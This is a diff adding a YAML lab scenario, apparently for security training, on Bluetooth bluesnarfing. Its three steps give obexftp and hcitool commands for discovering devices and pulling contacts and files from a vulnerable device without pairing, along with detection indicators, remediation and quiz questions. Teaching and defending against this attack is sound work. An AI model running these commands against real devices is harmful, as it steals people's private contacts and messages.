@@ -1,0 +1,107 @@
+# Category: Wireless Security
+name: "Bluetooth Bluesnarfing – Data Extraction from Devices"
+id: "wireless-bluetooth-snarf-001"
+category: "wireless_security"
+subcategory: "bluetooth"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Exploit Bluetooth OBEX (Object Exchange) vulnerabilities to read, copy,
+  or modify files from a vulnerable device without pairing. Bluesnarfing
+  targets devices with enabled Bluetooth and exposed OBEX services, allowing
+  attackers to extract contacts, SMS, calendars, and other personal data.
+
+learning_objectives:
+  - Understand Bluetooth RFCOMM and OBEX services
+  - Identify discoverable devices using hcitool or bluetoothctl
+  - Use tools like `obexftp` or `bluesnarfer` to access files
+  - Extract sensitive data
+
+tools:
+  - hcitool
+  - bluetoothctl
+  - obexftp
+  - bluesnarfer (legacy)
+  - Kali Linux tools
+
+prerequisites:
+  - Bluetooth adapter (CSR or compatible)
+  - Target device discoverable and vulnerable (old firmware)
+  - Target address (BD_ADDR)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Scan for Bluetooth devices"
+    commands:
+      - "# Enable interface"
+      - "hcitool dev"
+      - "# Scan for devices"
+      - "hcitool scan"
+      - "# Or use bluetoothctl"
+      - "bluetoothctl scan on"
+    expected_output: "List of Bluetooth devices with names and MACs"
+    detection: "Bluetooth discovery logs on device"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Attempt OBEX file access"
+    commands:
+      - "# Try to connect to OBEX FTP"
+      - "obexftp -b <BD_ADDR> -l"
+      - "# If successful, list directories"
+      - "obexftp -b <BD_ADDR> -l -c /"
+      - "# Download files (e.g., contacts.vcf)"
+      - "obexftp -b <BD_ADDR> -g contacts.vcf"
+    expected_output: "Files downloaded from device's OBEX share"
+    detection: "Bluetooth activity logs showing unauthorized OBEX connections"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Parse extracted data"
+    commands:
+      - "# View contacts"
+      - "cat contacts.vcf"
+      - "# Look for emails, phone numbers, saved passwords"
+    expected_output: "Personal information"
+    detection: "None (passive)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1595"
+    description: "Active Scanning"
+  - standard: "OWASP Mobile"
+    control: "M3"
+    description: "Insecure Communication"
+
+detection:
+  network_indicators:
+    - "OBEX connections from unknown devices"
+  log_indicators:
+    - "Device Bluetooth logs showing unauthorized access"
+  endpoint_indicators:
+    - "obexftp or bluesnarfer execution"
+
+remediation:
+  immediate:
+    - "Turn off Bluetooth when not in use"
+    - "Set device to non‑discoverable mode"
+  long_term:
+    - "Update device firmware to patch OBEX vulnerabilities"
+    - "Use Bluetooth 5.0 with LE Secure Connections"
+
+variables:
+  target_mac: "AA:BB:CC:DD:EE:FF"
+  interface: "hci0"
+
+assessment_questions:
+  - "What is the difference between bluesnarfing and bluejacking?"
+  - "Which Bluetooth service is targeted in a classic bluesnarf attack?"
+  - "How does Secure Simple Pairing (SSP) affect this attack?"
+
+references:
+  - url: "https://www.bluetooth.com/blog/bluetooth-security-in-depth/"
+    title: "Bluetooth Security"
+  - url: "https://www.kali.org/tools/bluesnarfer/"
+    title: "bluesnarfer tool"
